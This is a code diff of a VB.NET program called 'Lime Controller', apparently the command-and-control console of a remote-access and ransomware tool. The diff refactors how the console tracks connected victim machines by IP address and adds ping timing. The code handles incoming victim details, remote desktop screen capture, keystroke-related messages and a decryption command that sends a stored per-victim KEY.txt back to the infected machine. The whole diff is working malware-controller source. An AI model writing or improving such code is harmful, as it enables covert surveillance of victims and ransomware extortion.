@@ -31,7 +31,7 @@
 
 
 Public Class Form1
-    Public WithEvents S As New SocketServer
+    Public WithEvents S As Listner
     Public SPL As String = "|'L'|"
     Private m_SortingColumn As ColumnHeader
     Public Shared F As Form1
@@ -43,6 +43,7 @@ Public Class Form1
 
     Private Sub Form1_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
         NotifyIcon1.Dispose()
+        Application.Exit()
         End
     End Sub
     Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Me.Load
@@ -51,7 +52,7 @@ Public Class Form1
         Try
             MYPORT = InputBox("Select Port", "", My.Settings.port)
             If Not MYPORT = Nothing Then
-                S.Start(MYPORT)
+                S = New Listner(MYPORT)
                 My.Settings.port = MYPORT
             End If
         Catch ex As Exception
@@ -71,89 +72,107 @@ Public Class Form1
 
 
 #Region "Server Events"
-    Sub Disconnect(ByVal sock As Integer) Handles S.DisConnected
-        Try
-            L1.Items(sock.ToString).Remove()
-            Messages("{" + S.IP(sock.ToString) + "}", "Disconnected")
-        Catch ex As Exception
-        End Try
+    Private Sub S_Disconnected(ByVal u As USER) Handles S.Disconnected
+        SyncLock L1.Items
+            Try
+                L1.Items(u.IP).Remove()
+                Messages("{" + u.IP + "}", "Disconnected")
+            Catch ex As Exception
+            End Try
+        End SyncLock
     End Sub
 
-    Sub Connected(ByVal sock As Integer) Handles S.Connected
-        Messages("{" + S.IP(sock.ToString) + "}", "Connected")
+    Private Sub S_Connected(ByVal u As USER) Handles S.Connected
+        Messages("{" + u.IP + "}", "Connected")
     End Sub
 
-    Delegate Sub _Data(ByVal sock As Integer, ByVal B As Byte())
-    Sub Data(ByVal sock As Integer, ByVal B As Byte()) Handles S.Data
-        Dim T As String = BS(B)
-        Dim A As String() = Split(T, SPL)
+    Delegate Sub _Data(ByVal u As USER, ByVal b() As Byte)
+    Private Sub S_Data(ByVal u As USER, ByVal b() As Byte) Handles S.Data
+        Dim A As String() = Split(BS(b), SPL)
         Try
             Select Case A(0)
-                Case "~" ' Client Sent me PC name
+                Case "info" ' Client Sent me PC name
                     SyncLock L1.Items
-                        Dim L = L1.Items.Add(sock.ToString, S.IP(sock), 0)
-                        L.SubItems.Add(A(1))
-                        L.SubItems.Add(A(2))
-                        L.SubItems.Add(A(3))
-                        L.SubItems.Add(A(4))
-                        L.SubItems.Add(A(5))
-                        L.Tag = sock
+                        u.L = L1.Items.Add(u.IP, "", 0)
+                        u.L.Tag = u
+                        u.L.Text = A(1)
+                        u.L.SubItems.Add(u.IP.Split(":")(0))
+                        For i As Integer = 2 To A.Length - 1
+                            u.L.SubItems.Add(A(i))
+                        Next
+                        Fix()
                     End SyncLock
-                    Fix()
 
                     NotifyIcon1.BalloonTipIcon = ToolTipIcon.None
-                    NotifyIcon1.BalloonTipText = "User: " + A(2) + vbNewLine + "IP: " + S.IP(sock)
+                    NotifyIcon1.BalloonTipText = "User: " + A(2) + vbNewLine + "IP: " + u.IP
                     NotifyIcon1.BalloonTipTitle = "Lime Controller | New Connection!"
                     NotifyIcon1.ShowBalloonTip(600)
 
+                Case "ping" ' ping
+                    SyncLock L1.Items
+                        u.IsPinged = False
+                        u.L.SubItems(PING.Index).Text = u.MS & "ms"
+                        u.MS = 0
+                    End SyncLock
+
                 Case "!R"
                     SyncLock L1.Items
-                        L1.Items(sock.ToString).SubItems(5).Text = A(1).ToString
+                        L1.Items(u.IP).SubItems(5).Text = A(1).ToString
                     End SyncLock
                     Fix()
 
                 Case "!" ' i recive size of client screen
                     ' lets start Cap form and start capture desktop
-                    If My.Application.OpenForms("!" & sock) IsNot Nothing Then Exit Sub
                     If Me.InvokeRequired Then
-                        Dim j As New _Data(AddressOf Data)
-                        Me.Invoke(j, New Object() {sock, B})
+                        Me.Invoke(New _Data(AddressOf S_Data), u, b)
                         Exit Sub
                     End If
-                    Dim cap As New Cap
-                    cap.F = Me
-                    cap.Sock = sock
-                    cap.Name = "!" & sock
-                    cap.Sz = New Size(A(1), A(2))
-                    cap.Show()
+
+                    Dim Cap As Cap = My.Application.OpenForms("!" + u.IP)
+
+                    If Cap Is Nothing Then
+                        Cap = New Cap
+                        Cap.F = Me
+                        Cap.u = u
+                        Cap.Name = "!" + u.IP
+                        Cap.Sz = New Size(A(1), A(2))
+                        Cap.Show()
+                    End If
 
                 Case "@" ' i recive image  
-                    Dim F As Cap = My.Application.OpenForms("!" & sock)
-                    If F IsNot Nothing Then
+
+                    If Me.InvokeRequired Then
+                        Me.Invoke(New _Data(AddressOf S_Data), u, b)
+                        Exit Sub
+                    End If
+
+                    Dim Cap As Cap = My.Application.OpenForms("!" + u.IP)
+                    If Cap IsNot Nothing Then
                         If A(1).Length = 1 Then
-                            F.Text = "Size: " & siz(B.Length) & " ,No Changes"
-                            If F.Button1.Text = "Stop" Then
-                                S.Send(sock, "@" & SPL & F.C1.SelectedIndex & SPL & "5" & SPL & F.C.Value)
+                            Cap.Text = "Size: " & siz(b.Length) & " ,No Changes"
+                            If Cap.Button1.Text = "Stop" Then
+                                S.Send(u, "@" & SPL & Cap.C1.SelectedIndex & SPL & Cap.C2.Text & SPL & Cap.C.Value)
                             End If
                             Exit Sub
                         End If
-                        Dim BB As Byte() = fx(B, "@" & SPL)(1)
-                        F.PktToImage(BB)
+                        Dim BB As Byte() = fx(b, "@" & SPL)(1)
+                        Cap.PktToImage(BB)
                     End If
 
                 Case "Details"
-                    If My.Application.OpenForms("D" & sock) IsNot Nothing Then Exit Sub
                     If Me.InvokeRequired Then
-                        Dim j As New _Data(AddressOf Data)
-                        Me.Invoke(j, New Object() {sock, B})
+                        Me.Invoke(New _Data(AddressOf S_Data), u, b)
                         Exit Sub
                     End If
-                    Dim D As New Details
-                    D.F = Me
-                    D.Sock = sock
-                    D.Name = "D" & sock
-                    D.Text = "Details" + "_" + S.IP(sock.ToString)
-                    D.Show()
+
+                    Dim D As Details = My.Application.OpenForms("D" + u.IP)
+                    If D Is Nothing Then
+                        D = New Details
+                        D.F = Me
+                        D.U = u
+                        D.Name = "D" + u.IP
+                        D.Show()
+                    End If
 
                     D.ListView1.Items.Clear()
 
@@ -174,7 +193,7 @@ Public Class Form1
                     D.ListView1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
 
                 Case "MSG"
-                    Messages("{" + S.IP(sock.ToString) + "}", A(1).ToString)
+                    Messages("{" + u.IP + "}", A(1).ToString)
 
                 Case "Key"
 
@@ -437,7 +456,7 @@ Public Class Form1
     Private Sub DecryptionToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DecryptionToolStripMenuItem.Click
         Try
             For Each x As ListViewItem In L1.SelectedItems
-                S.Send(x.Tag, "DEC" & SPL & IO.File.ReadAllText("Users" + "\" + x.SubItems(2).Text + "_" + x.SubItems(1).Text + "\" + "KEY.txt"))
+                S.Send(x.Tag, "DEC" & SPL & IO.File.ReadAllText("Users" + "\" + x.SubItems(2).Text + "_" + x.SubItems(0).Text + "\" + "KEY.txt"))
             Next
         Catch ex As Exception
             MsgBox(ex.Message)
